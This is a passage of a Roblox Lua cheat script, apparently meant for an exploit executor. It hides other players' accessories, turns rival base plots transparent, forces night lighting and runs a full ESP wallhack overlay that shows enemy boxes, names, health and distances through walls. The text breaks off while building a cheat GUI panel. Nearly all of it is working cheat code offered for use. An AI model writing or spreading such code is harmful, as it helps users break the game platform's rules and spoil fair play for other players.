task.wait(1)
-- SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
-- Wait for services to be ready
if not Players then
    warn("Players service not available")
    return
end
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    warn("LocalPlayer not available")
    return
end
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local childConnByChar = {}
local function clearCharacter(char)
    if not char then return end
    for _, c in ipairs(char:GetChildren()) do
        if c:IsA("Accessory") then
            c:Destroy()
        end
    end
    if childConnByChar[char] then
        childConnByChar[char]:Disconnect()
        childConnByChar[char] = nil
    end
    childConnByChar[char] = char.ChildAdded:Connect(function(c)
        if c:IsA("Accessory") then
            c:Destroy()
        end
    end)
    char.AncestryChanged:Connect(function(_, parent)
        if not parent then
            if childConnByChar[char] then
                childConnByChar[char]:Disconnect()
                childConnByChar[char] = nil
            end
        end
    end)
end
local function hookPlayer(player)
    if player.Character then
        clearCharacter(player.Character)
    end
    player.CharacterAdded:Connect(function(char) clearCharacter(char) end)
end
for _, p in ipairs(Players:GetPlayers()) do
    hookPlayer(p)
end
Players.PlayerAdded:Connect(hookPlayer)
local TRANSPARENCY = 0.7
local SIZE_TOLERANCE = 0.05
local function isSizeApprox(sizeVec3, x, y, z)
return math.abs(sizeVec3.X - x) <= SIZE_TOLERANCE
   and math.abs(sizeVec3.Y - y) <= SIZE_TOLERANCE
   and math.abs(sizeVec3.Z - z) <= SIZE_TOLERANCE
end
local function isMyPlot(plot)
local sign = plot:FindFirstChild("PlotSign")
if not sign then return false end
local surfaceGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
if not surfaceGui then return false end
local label = surfaceGui:FindFirstChildWhichIsA("TextLabel", true)
if not label then return false end
local text = label.Text:lower()
return text:find(LocalPlayer.DisplayName:lower()) or text:find(LocalPlayer.Name:lower())
end
local function applyTransparencyToPart(v)
if not v or not v:IsA("BasePart") then return end
local name = v.Name
local parentName = v.Parent and v.Parent.Name or ""
if name == "structure base home" then
v.Transparency = TRANSPARENCY
elseif name == "Decoration" and parentName == "Decorations" then
v.Transparency = TRANSPARENCY
local part = v.Parent:FindFirstChild("Part")
if part and part:IsA("BasePart") then part.Transparency = TRANSPARENCY end
elseif name == "Main" and parentName == "Claim" then
v.Transparency = TRANSPARENCY
end
end
local function transAll()
local plots = Workspace:FindFirstChild("Plots")
if not plots then return end
for _, plot in ipairs(plots:GetChildren()) do
if not isMyPlot(plot) then
for _, v in ipairs(plot:GetDescendants()) do
local ok, err = pcall(function() applyTransparencyToPart(v) end)
if not ok then warn("[transAll] error:", err) end
end
end
end
end
local function connectPlots()
local plots = Workspace:FindFirstChild("Plots") or Workspace:WaitForChild("Plots", 10)
if not plots then return end
transAll()
plots.DescendantAdded:Connect(function(desc)
task.defer(function()
task.wait(0.05)
local parentPlot = desc:FindFirstAncestorOfClass("Model")
if parentPlot and not isMyPlot(parentPlot) then
local ok, err = pcall(function() applyTransparencyToPart(desc) end)
if not ok then warn("[connectPlots] error:", err) end
end
end)
end)
end
if not RunService:IsStudio() then
    repeat task.wait() until game:IsLoaded()
end
connectPlots()
Players.PlayerAdded:Connect(function() transAll() end)
local function createHighlight(target)
    local hl = Instance.new("Highlight")
    hl.Name = "RainbowHighlighter"
    hl.Adornee = target
    hl.FillTransparency = 0.7
    hl.OutlineTransparency = 0
    hl.Parent = target
    return hl
end
local function findMyBase()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    for _, plot in ipairs(plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local surfaceGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
            if surfaceGui then
                local label = surfaceGui:FindFirstChildWhichIsA("TextLabel", true)
                if label then
                    local text = label.Text:lower()
                    if text:find(LocalPlayer.DisplayName:lower()) or text:find(LocalPlayer.Name:lower()) then
                        return plot
                    end
                end
            end
        end
    end
    return nil
end
local function rainbowLoop(highlighter, beam)
    local t = 0
    RunService.Heartbeat:Connect(function(dt)
        t = t + dt
        local color = Color3.fromHSV((t*0.2) % 1, 1, 1)
        if highlighter then
            highlighter.FillColor = color
            highlighter.OutlineColor = color
        end
        if beam then
            beam.Color = ColorSequence.new(color)
        end
    end)
end
local function createBeam(base)
    local hrp = LocalPlayer.Character and LocalPlayer.Character:WaitForChild("HumanoidRootPart")
    if not hrp then return nil end
    local attach1 = hrp:FindFirstChild("BeamAttach_Player") or Instance.new("Attachment")
    attach1.Name = "BeamAttach_Player"
    attach1.Parent = hrp
    local basePart = base:FindFirstChild("MainRootPart") or base:FindFirstChildWhichIsA("BasePart")
    if not basePart then return nil end
    local attach2 = basePart:FindFirstChild("BeamAttach_Base") or Instance.new("Attachment")
    attach2.Name = "BeamAttach_Base"
    attach2.Parent = basePart
    local beam = hrp:FindFirstChild("BaseBeam") or Instance.new("Beam")
    beam.Name = "BaseBeam"
    beam.Attachment0 = attach1
    beam.Attachment1 = attach2
    beam.FaceCamera = false
    beam.LightEmission = 2
    beam.Transparency = NumberSequence.new(0)
    beam.Width0 = 2
    beam.Width1 = 6
    beam.TextureMode = Enum.TextureMode.Wrap
    beam.TextureSpeed = 0
    beam.Parent = hrp
    return beam
end
local function highlightBase()
    local myBase = findMyBase()
    if not myBase then return end
    if myBase:FindFirstChild("RainbowHighlighter") then
        myBase.RainbowHighlighter:Destroy()
    end
    local hl = createHighlight(myBase)
    local beam = createBeam(myBase)
    rainbowLoop(hl, beam)
end
task.spawn(function()
    repeat task.wait() until game:IsLoaded()
    highlightBase()
end)
local Workspace, RunService, Players, CoreGui, Lighting = cloneref(game:GetService("Workspace")), cloneref(game:GetService("RunService")), cloneref(game:GetService("Players")), game:GetService("CoreGui"), cloneref(game:GetService("Lighting"))
local ESP = {
    Enabled = true,
    TeamCheck = true,
    MaxDistance = 200,
    FontSize = 24,
    FadeOut = {
        OnDistance = true,
        OnDeath = false,
        OnLeave = false,
    },
    Options = {
        Teamcheck = false, TeamcheckRGB = Color3.fromRGB(0, 255, 0),
        Friendcheck = true, FriendcheckRGB = Color3.fromRGB(0, 255, 0),
        Highlight = false, HighlightRGB = Color3.fromRGB(255, 0, 0),
    },
    Drawing = {
        Chams = {
            Enabled = true,
            Thermal = true,
            FillRGB = Color3.fromRGB(119, 120, 255),
            Fill_Transparency = 100,
            OutlineRGB = Color3.fromRGB(119, 120, 255),
            Outline_Transparency = 100,
            VisibleCheck = true,
        },
        Names = {
            Enabled = true,
            RGB = Color3.fromRGB(255, 255, 255),
        },
        Flags = {
            Enabled = true,
        },
        Distances = {
            Enabled = true,
            Position = "Text",
            RGB = Color3.fromRGB(255, 255, 255),
        },
        Weapons = {
            Enabled = true, WeaponTextRGB = Color3.fromRGB(119, 120, 255),
            Outlined = false,
            Gradient = false,
            GradientRGB1 = Color3.fromRGB(255, 255, 255), GradientRGB2 = Color3.fromRGB(119, 120, 255),
        },
        Healthbar = {
            Enabled = true,
            HealthText = true, Lerp = false, HealthTextRGB = Color3.fromRGB(119, 120, 255),
            Width = 2.5,
            Gradient = true, GradientRGB1 = Color3.fromRGB(200, 0, 0), GradientRGB2 = Color3.fromRGB(60, 60, 125), GradientRGB3 = Color3.fromRGB(119, 120, 255),
        },
        Boxes = {
            Animate = true,
            RotationSpeed = 300,
            Gradient = false, GradientRGB1 = Color3.fromRGB(119, 120, 255), GradientRGB2 = Color3.fromRGB(0, 0, 0),
            GradientFill = true, GradientFillRGB1 = Color3.fromRGB(119, 120, 255), GradientFillRGB2 = Color3.fromRGB(0, 0, 0),
            Filled = {
                Enabled = true,
                Transparency = 0.75,
                RGB = Color3.fromRGB(0, 0, 0),
            },
            Full = {
                Enabled = true,
                RGB = Color3.fromRGB(255, 255, 255),
            },
            Corner = {
                Enabled = true,
                RGB = Color3.fromRGB(255, 255, 255),
            },
        };
    };
    Connections = {
        RunService = RunService;
    };
    Fonts = {};
}
-- Def & Vars
local Euphoria = ESP.Connections;
local lplayer = Players.LocalPlayer;
local camera = game.Workspace.CurrentCamera;
local Cam = Workspace.CurrentCamera;
local RotationAngle, Tick = -45, tick();
-- Weapon Icons
local Weapon_Icons = {
    ["Wooden Bow"] = "http://www.roblox.com/asset/?id=17677465400",
    ["Crossbow"] = "http://www.roblox.com/asset/?id=17677473017",
    ["Salvaged SMG"] = "http://www.roblox.com/asset/?id=17677463033",
    ["Salvaged AK47"] = "http://www.roblox.com/asset/?id=17677455113",
    ["Salvaged AK74u"] = "http://www.roblox.com/asset/?id=17677442346",
    ["Salvaged M14"] = "http://www.roblox.com/asset/?id=17677444642",
    ["Salvaged Python"] = "http://www.roblox.com/asset/?id=17677451737",
    ["Military PKM"] = "http://www.roblox.com/asset/?id=17677449448",
    ["Military M4A1"] = "http://www.roblox.com/asset/?id=17677479536",
    ["Bruno's M4A1"] = "http://www.roblox.com/asset/?id=17677471185",
    ["Military Barrett"] = "http://www.roblox.com/asset/?id=17677482998",
    ["Salvaged Skorpion"] = "http://www.roblox.com/asset/?id=17677459658",
    ["Salvaged Pump Action"] = "http://www.roblox.com/asset/?id=17677457186",
    ["Military AA12"] = "http://www.roblox.com/asset/?id=17677475227",
    ["Salvaged Break Action"] = "http://www.roblox.com/asset/?id=17677468751",
    ["Salvaged Pipe Rifle"] = "http://www.roblox.com/asset/?id=17677468751",
    ["Salvaged P250"] = "http://www.roblox.com/asset/?id=17677447257",
    ["Nail Gun"] = "http://www.roblox.com/asset/?id=17677484756"
};
-- Functions
local Functions = {}
do
    function Functions:Create(Class, Properties)
        local _Instance = typeof(Class) == 'string' and Instance.new(Class) or Class
        for Property, Value in pairs(Properties) do
            _Instance[Property] = Value
        end
        return _Instance;
    end
    --
    function Functions:FadeOutOnDist(element, distance)
        local transparency = math.max(0.1, 1 - (distance / ESP.MaxDistance))
        if element:IsA("TextLabel") then
            element.TextTransparency = 1 - transparency
        elseif element:IsA("ImageLabel") then
            element.ImageTransparency = 1 - transparency
        elseif element:IsA("UIStroke") then
            element.Transparency = 1 - transparency
        elseif element:IsA("Frame") and (element == Healthbar or element == BehindHealthbar) then
            element.BackgroundTransparency = 1 - transparency
        elseif element:IsA("Frame") then
            element.BackgroundTransparency = 1 - transparency
        elseif element:IsA("Highlight") then
            element.FillTransparency = 1 - transparency
            element.OutlineTransparency = 1 - transparency
        end;
    end;
end;
do -- Initalize
    local ScreenGui = Functions:Create("ScreenGui", {
        Parent = CoreGui,
        Name = "ESPHolder",
    });
    local DupeCheck = function(plr)
        if ScreenGui:FindFirstChild(plr.Name) then
            ScreenGui[plr.Name]:Destroy()
        end
    end
    local ESP = function(plr)
        coroutine.wrap(DupeCheck)(plr)
        local Name = Functions:Create("TextLabel", {Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, -11), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0), RichText = true})
        local Distance = Functions:Create("TextLabel", {Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, 11), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0), RichText = true})
        local Weapon = Functions:Create("TextLabel", {Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, 31), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0), RichText = true})
        local Box = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0.75, BorderSizePixel = 0})
        local Gradient1 = Functions:Create("UIGradient", {Parent = Box, Enabled = ESP.Drawing.Boxes.GradientFill, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, ESP.Drawing.Boxes.GradientFillRGB1), ColorSequenceKeypoint.new(1, ESP.Drawing.Boxes.GradientFillRGB2)}})
        local Outline = Functions:Create("UIStroke", {Parent = Box, Enabled = ESP.Drawing.Boxes.Gradient, Transparency = 0, Color = Color3.fromRGB(255, 255, 255), LineJoinMode = Enum.LineJoinMode.Miter})
        local Gradient2 = Functions:Create("UIGradient", {Parent = Outline, Enabled = ESP.Drawing.Boxes.Gradient, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, ESP.Drawing.Boxes.GradientRGB1), ColorSequenceKeypoint.new(1, ESP.Drawing.Boxes.GradientRGB2)}})
        local Healthbar = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 0})
        local BehindHealthbar = Functions:Create("Frame", {Parent = ScreenGui, ZIndex = -1, BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0})
        local HealthbarGradient = Functions:Create("UIGradient", {Parent = Healthbar, Enabled = ESP.Drawing.Healthbar.Gradient, Rotation = -90, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, ESP.Drawing.Healthbar.GradientRGB1), ColorSequenceKeypoint.new(0.5, ESP.Drawing.Healthbar.GradientRGB2), ColorSequenceKeypoint.new(1, ESP.Drawing.Healthbar.GradientRGB3)}})
        local HealthText = Functions:Create("TextLabel", {Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, 31), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0)})
        local Chams = Functions:Create("Highlight", {Parent = ScreenGui, FillTransparency = 1, OutlineTransparency = 0, OutlineColor = Color3.fromRGB(119, 120, 255), DepthMode = "AlwaysOnTop"})
        local WeaponIcon = Functions:Create("ImageLabel", {Parent = ScreenGui, BackgroundTransparency = 1, BorderColor3 = Color3.fromRGB(0, 0, 0), BorderSizePixel = 0, Size = UDim2.new(0, 40, 0, 40)})
        local Gradient3 = Functions:Create("UIGradient", {Parent = WeaponIcon, Rotation = -90, Enabled = ESP.Drawing.Weapons.Gradient, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, ESP.Drawing.Weapons.GradientRGB1), ColorSequenceKeypoint.new(1, ESP.Drawing.Weapons.GradientRGB2)}})
        local LeftTop = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local LeftSide = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local RightTop = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local RightSide = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local BottomSide = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local BottomDown = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local BottomRightSide = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local BottomRightDown = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0)})
        local Flag1 = Functions:Create("TextLabel", {Parent = ScreenGui, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0)})
        local Flag2 = Functions:Create("TextLabel", {Parent = ScreenGui, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0)})
        --
        local Updater = function()
            local Connection;
            local function HideESP()
                Box.Visible = false;
                Name.Visible = false;
                Distance.Visible = false;
                Weapon.Visible = false;
                Healthbar.Visible = false;
                BehindHealthbar.Visible = false;
                HealthText.Visible = false;
                WeaponIcon.Visible = false;
                LeftTop.Visible = false;
                LeftSide.Visible = false;
                BottomSide.Visible = false;
                BottomDown.Visible = false;
                RightTop.Visible = false;
                RightSide.Visible = false;
                BottomRightSide.Visible = false;
                BottomRightDown.Visible = false;
                Flag1.Visible = false;
                Chams.Enabled = false;
                Flag2.Visible = false;
                if not plr then
                    ScreenGui:Destroy();
                    Connection:Disconnect();
                end
            end
            --
            Connection = Euphoria.RunService.RenderStepped:Connect(function()
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    local HRP = plr.Character.HumanoidRootPart
                    local Humanoid = plr.Character:WaitForChild("Humanoid");
                    local Pos, OnScreen = Cam:WorldToScreenPoint(HRP.Position)
                    local Dist = (Cam.CFrame.Position - HRP.Position).Magnitude / 3.5714285714
                  
                    if OnScreen and Dist <= ESP.MaxDistance then
                        local Size = HRP.Size.Y
                        local scaleFactor = (Size * Cam.ViewportSize.Y) / (Pos.Z * 2)
                        local w, h = 3 * scaleFactor, 4.5 * scaleFactor
                        -- Fade-out effect --
                        if ESP.FadeOut.OnDistance then
                            Functions:FadeOutOnDist(Box, Dist)
                            Functions:FadeOutOnDist(Outline, Dist)
                            Functions:FadeOutOnDist(Name, Dist)
                            Functions:FadeOutOnDist(Distance, Dist)
                            Functions:FadeOutOnDist(Weapon, Dist)
                            Functions:FadeOutOnDist(Healthbar, Dist)
                            Functions:FadeOutOnDist(BehindHealthbar, Dist)
                            Functions:FadeOutOnDist(HealthText, Dist)
                            Functions:FadeOutOnDist(WeaponIcon, Dist)
                            Functions:FadeOutOnDist(LeftTop, Dist)
                            Functions:FadeOutOnDist(LeftSide, Dist)
                            Functions:FadeOutOnDist(BottomSide, Dist)
                            Functions:FadeOutOnDist(BottomDown, Dist)
                            Functions:FadeOutOnDist(RightTop, Dist)
                            Functions:FadeOutOnDist(RightSide, Dist)
                            Functions:FadeOutOnDist(BottomRightSide, Dist)
                            Functions:FadeOutOnDist(BottomRightDown, Dist)
                            Functions:FadeOutOnDist(Chams, Dist)
                            Functions:FadeOutOnDist(Flag1, Dist)
                            Functions:FadeOutOnDist(Flag2, Dist)
                        end
                        -- Teamcheck
                        if ESP.TeamCheck and plr ~= lplayer and ((lplayer.Team ~= plr.Team and plr.Team) or (not lplayer.Team and not plr.Team)) and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") then
                            do -- Chams
                                Chams.Adornee = plr.Character
                                Chams.Enabled = ESP.Drawing.Chams.Enabled
                                Chams.FillColor = ESP.Drawing.Chams.FillRGB
                                Chams.OutlineColor = ESP.Drawing.Chams.OutlineRGB
                                do -- Breathe
                                    if ESP.Drawing.Chams.Thermal then
                                        local breathe_effect = math.atan(math.sin(tick() * 2)) * 2 / math.pi
                                        Chams.FillTransparency = ESP.Drawing.Chams.Fill_Transparency * breathe_effect * 0.01
                                        Chams.OutlineTransparency = ESP.Drawing.Chams.Outline_Transparency * breathe_effect * 0.01
                                    end
                                end
                                if ESP.Drawing.Chams.VisibleCheck then
                                    Chams.DepthMode = "Occluded"
                                else
                                    Chams.DepthMode = "AlwaysOnTop"
                                end
                            end;
                            do -- Corner Boxes
                                LeftTop.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                LeftTop.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)
                                LeftTop.Size = UDim2.new(0, w / 5, 0, 1)
                              
                                LeftSide.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                LeftSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)
                                LeftSide.Size = UDim2.new(0, 1, 0, h / 5)
                              
                                BottomSide.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                BottomSide.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y + h / 2)
                                BottomSide.Size = UDim2.new(0, 1, 0, h / 5)
                                BottomSide.AnchorPoint = Vector2.new(0, 5)
                              
                                BottomDown.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                BottomDown.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y + h / 2)
                                BottomDown.Size = UDim2.new(0, w / 5, 0, 1)
                                BottomDown.AnchorPoint = Vector2.new(0, 1)
                              
                                RightTop.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                RightTop.Position = UDim2.new(0, Pos.X + w / 2, 0, Pos.Y - h / 2)
                                RightTop.Size = UDim2.new(0, w / 5, 0, 1)
                                RightTop.AnchorPoint = Vector2.new(1, 0)
                              
                                RightSide.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                RightSide.Position = UDim2.new(0, Pos.X + w / 2 - 1, 0, Pos.Y - h / 2)
                                RightSide.Size = UDim2.new(0, 1, 0, h / 5)
                                RightSide.AnchorPoint = Vector2.new(0, 0)
                              
                                BottomRightSide.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                BottomRightSide.Position = UDim2.new(0, Pos.X + w / 2, 0, Pos.Y + h / 2)
                                BottomRightSide.Size = UDim2.new(0, 1, 0, h / 5)
                                BottomRightSide.AnchorPoint = Vector2.new(1, 1)
                              
                                BottomRightDown.Visible = ESP.Drawing.Boxes.Corner.Enabled
                                BottomRightDown.Position = UDim2.new(0, Pos.X + w / 2, 0, Pos.Y + h / 2)
                                BottomRightDown.Size = UDim2.new(0, w / 5, 0, 1)
                                BottomRightDown.AnchorPoint = Vector2.new(1, 1)
                            end
                            do -- Boxes
                                Box.Position = UDim2.new(0, Pos.X - w / 2, 0, Pos.Y - h / 2)
                                Box.Size = UDim2.new(0, w, 0, h)
                                Box.Visible = ESP.Drawing.Boxes.Full.Enabled;
                                -- Gradient
                                if ESP.Drawing.Boxes.Filled.Enabled then
                                    Box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                                    if ESP.Drawing.Boxes.GradientFill then
                                        Box.BackgroundTransparency = ESP.Drawing.Boxes.Filled.Transparency;
                                    else
                                        Box.BackgroundTransparency = 1
                                    end
                                    Box.BorderSizePixel = 1
                                else
                                    Box.BackgroundTransparency = 1
                                end
                                -- Animation
                                RotationAngle = RotationAngle + (tick() - Tick) * ESP.Drawing.Boxes.RotationSpeed * math.cos(math.pi / 4 * tick() - math.pi / 2)
                                if ESP.Drawing.Boxes.Animate then
                                    Gradient1.Rotation = RotationAngle
                                    Gradient2.Rotation = RotationAngle
                                else
                                    Gradient1.Rotation = -45
                                    Gradient2.Rotation = -45
                                end
                                Tick = tick()
                            end
                            -- Healthbar
                            do
                                local health = Humanoid.Health / Humanoid.MaxHealth;
                                Healthbar.Visible = ESP.Drawing.Healthbar.Enabled;
                                Healthbar.Position = UDim2.new(0, Pos.X - w / 2 - 6, 0, Pos.Y - h / 2 + h * (1 - health))
                                Healthbar.Size = UDim2.new(0, ESP.Drawing.Healthbar.Width, 0, h * health)
                                --
                                BehindHealthbar.Visible = ESP.Drawing.Healthbar.Enabled;
                                BehindHealthbar.Position = UDim2.new(0, Pos.X - w / 2 - 6, 0, Pos.Y - h / 2)
                                BehindHealthbar.Size = UDim2.new(0, ESP.Drawing.Healthbar.Width, 0, h)
                                -- Health Text
                                do
                                    if ESP.Drawing.Healthbar.HealthText then
                                        local healthPercentage = math.floor(Humanoid.Health / Humanoid.MaxHealth * 100)
                                        HealthText.Position = UDim2.new(0, Pos.X - w / 2 - 6, 0, Pos.Y - h / 2 + h * (1 - healthPercentage / 100) + 3)
                                        HealthText.Text = tostring(healthPercentage)
                                        HealthText.Visible = Humanoid.Health < Humanoid.MaxHealth
                                        if ESP.Drawing.Healthbar.Lerp then
                                            local color = health >= 0.75 and Color3.fromRGB(0, 255, 0) or health >= 0.5 and Color3.fromRGB(255, 255, 0) or health >= 0.25 and Color3.fromRGB(255, 170, 0) or Color3.fromRGB(255, 0, 0)
                                            HealthText.TextColor3 = color
                                        else
                                            HealthText.TextColor3 = ESP.Drawing.Healthbar.HealthTextRGB
                                        end
                                    end
                                end
                            end
                            do -- Names
                                Name.Visible = ESP.Drawing.Names.Enabled
                                if ESP.Options.Friendcheck and lplayer:IsFriendsWith(plr.UserId) then
                                    Name.Text = string.format('(<font color="rgb(%d, %d, %d)">F</font>) %s', ESP.Options.FriendcheckRGB.R * 255, ESP.Options.FriendcheckRGB.G * 255, ESP.Options.FriendcheckRGB.B * 255, plr.DisplayName)
                                else
                                    Name.Text = string.format('(<font color="rgb(%d, %d, %d)">E</font>) %s', 255, 0, 0, plr.DisplayName)
                                end
                                Name.Position = UDim2.new(0, Pos.X, 0, Pos.Y - h / 2 - 9)
                            end
                          
                            do -- Distance
                                if ESP.Drawing.Distances.Enabled then
                                    if ESP.Drawing.Distances.Position == "Bottom" then
                                        Weapon.Position = UDim2.new(0, Pos.X, 0, Pos.Y + h / 2 + 18)
                                        WeaponIcon.Position = UDim2.new(0, Pos.X - 21, 0, Pos.Y + h / 2 + 15);
                                        Distance.Position = UDim2.new(0, Pos.X, 0, Pos.Y + h / 2 + 7)
                                        Distance.Text = string.format("%d meters", math.floor(Dist))
                                        Distance.Visible = true
                                    elseif ESP.Drawing.Distances.Position == "Text" then
                                        Weapon.Position = UDim2.new(0, Pos.X, 0, Pos.Y + h / 2 + 8)
                                        WeaponIcon.Position = UDim2.new(0, Pos.X - 21, 0, Pos.Y + h / 2 + 5);
                                        Distance.Visible = false
                                        if ESP.Options.Friendcheck and lplayer:IsFriendsWith(plr.UserId) then
                                            Name.Text = string.format('(<font color="rgb(%d, %d, %d)">F</font>) %s [%d]', ESP.Options.FriendcheckRGB.R * 255, ESP.Options.FriendcheckRGB.G * 255, ESP.Options.FriendcheckRGB.B * 255, plr.DisplayName, math.floor(Dist))
                                        else
                                            Name.Text = string.format('(<font color="rgb(%d, %d, %d)">E</font>) %s [%d]', 255, 0, 0, plr.DisplayName, math.floor(Dist))
                                        end
                                        Name.Visible = ESP.Drawing.Names.Enabled
                                    end
                                end
                            end
                            do -- Weapons
                                Weapon.Text = "none"
                                Weapon.Visible = ESP.Drawing.Weapons.Enabled
                            end
                        else
                            HideESP();
                        end
                    else
                        HideESP();
                    end
                else
                    HideESP();
                end
            end)
        end
        coroutine.wrap(Updater)();
    end
    do -- Update ESP
        for _, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= lplayer.Name then
                coroutine.wrap(ESP)(v)
            end
        end
        --
        game:GetService("Players").PlayerAdded:Connect(function(v)
            coroutine.wrap(ESP)(v)
        end);
    end;
end;
local NIGHT_TIME = 0
local KEEP_LOCKED = true
local function setNight()
    Lighting.ClockTime = NIGHT_TIME
    Lighting.Brightness = 2
    Lighting.OutdoorAmbient = Color3.fromRGB(60, 60, 80)
end
setNight()
if KEEP_LOCKED then
    RunService.Heartbeat:Connect(function()
        Lighting.ClockTime = NIGHT_TIME
    end)
end
-- Remove existing GUIs
local existing = playerGui:FindFirstChild("AdminPanelUI")
if existing then existing:Destroy() end
local existing2 = CoreGui:FindFirstChild("QuantumClonerUI")
if existing2 then existing2:Destroy() end
local GLITCH_THEME = {
    GlitchBg = Color3.fromRGB(0, 0, 0),
    PanelBg = Color3.fromRGB(10, 10, 20),
    GlitchRed = Color3.fromRGB(255, 0, 0),
    GlitchGreen = Color3.fromRGB(0, 255, 0),
    GlitchBlue = Color3.fromRGB(0, 0, 255),
    GlitchPurple = Color3.fromRGB(128, 0, 128),
    GlitchCyan = Color3.fromRGB(0, 255, 255),
    GlitchYellow = Color3.fromRGB(255, 255, 0),
    TextGlitch = Color3.fromRGB(255, 0, 255),
    TextShadow = Color3.fromRGB(100, 100, 100),
    TextError = Color3.fromRGB(255, 50, 50),
    BorderGlitch = Color3.fromRGB(255, 0, 255),
    DividerGlitch = Color3.fromRGB(50, 0, 50),
    OverlayGlitch = Color3.fromRGB(20, 0, 20),
    GlowGlitch = Color3.fromRGB(255, 0, 255),
    HighlightGlitch = Color3.fromRGB(0, 255, 255),
}
local function glitchTween(object, properties, duration, easingStyle)
    duration = duration or 0.15
    easingStyle = easingStyle or Enum.EasingStyle.Linear
    local tween = TweenService:Create(object, TweenInfo.new(duration, easingStyle, Enum.EasingDirection.InOut), properties)
    tween:Play()
    return tween
end
local function addGlitchCorners(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius or 4)
    corner.Parent = parent
